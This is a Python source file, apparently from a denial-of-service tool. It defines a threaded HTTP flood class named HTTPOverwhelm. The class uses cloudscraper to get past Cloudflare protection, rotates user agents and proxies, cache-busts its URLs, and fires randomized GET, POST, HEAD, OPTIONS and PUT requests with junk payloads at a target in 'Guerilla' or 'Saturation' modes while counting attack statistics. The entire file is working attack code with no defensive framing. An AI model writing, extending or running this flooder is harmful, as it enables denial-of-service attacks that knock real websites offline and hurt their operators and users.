import threading
import random
import time
from urllib.parse import urlparse, urljoin

import cloudscraper
import requests

import config
from utils.network import get_random_user_agent

class HTTPOverwhelm(threading.Thread):
    def __init__(self, target_url, mode):
        super().__init__()
        self.daemon = True
        self.target_url = target_url
        self.mode = mode
        self.scraper = cloudscraper.create_scraper()

    def get_attack_params(self):
        if not config.proxies:
            return config.adaptive_delay.value
        
        delay = 0
        if self.mode == "Guerilla":
            delay = random.uniform(0.8, 2.5)
        elif self.mode == "Saturation":
            delay = random.uniform(0, 0.2)
        return delay

    def build_headers(self, referer=None):
        headers = {
            'User-Agent': get_random_user_agent(),
            'Accept': '*/*',
            'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
        }
        if referer:
            headers['Referer'] = referer
        return headers

    def run(self):
        config.attack_stats["active_threads"] += 1
        
        while not config.stop_event.is_set():
            delay = self.get_attack_params()
            proxy = config.proxies if config.proxies else None
            referer = urljoin(self.target_url, str(random.randint(1,1000)))
            headers = self.build_headers(referer)
            
            url_with_cache_bust = f"{self.target_url}?_={random.randint(1, int(1e12))}"

            try:
                method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT'])
                
                if method == 'GET':
                    response = self.scraper.get(url_with_cache_bust, headers=headers, proxies=proxy, timeout=config.PROXY_TIMEOUT)
                elif method == 'POST':
                    payload_key = ''.join(random.choice('abcdef') for _ in range(8))
                    payload_value = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(32))
                    response = self.scraper.post(url_with_cache_bust, headers=headers, proxies=proxy, timeout=config.PROXY_TIMEOUT, data={payload_key: payload_value})
                else:
                    response = self.scraper.request(method, url_with_cache_bust, headers=headers, proxies=proxy, timeout=config.PROXY_TIMEOUT)
                
                config.attack_stats["requests_sent"] += 1
                if 200 <= response.status_code < 400:
                    config.attack_stats["http_ok"] += 1
                else:
                    config.attack_stats["http_error"] += 1
                
                request_size = len(response.request.method) + len(response.request.url) + len('\r\n'.join(f'{k}: {v}' for k, v in response.request.headers.items()))
                config.attack_stats["bytes_sent"] += request_size

            except requests.exceptions.Timeout:
                config.attack_stats["timeout_error"] += 1
            except requests.exceptions.ConnectionError:
                config.attack_stats["connect_error"] += 1
            except Exception:
                config.attack_stats["connect_error"] += 1
            
            if delay > 0:
                time.sleep(delay)
        
        config.attack_stats["active_threads"] -= 1

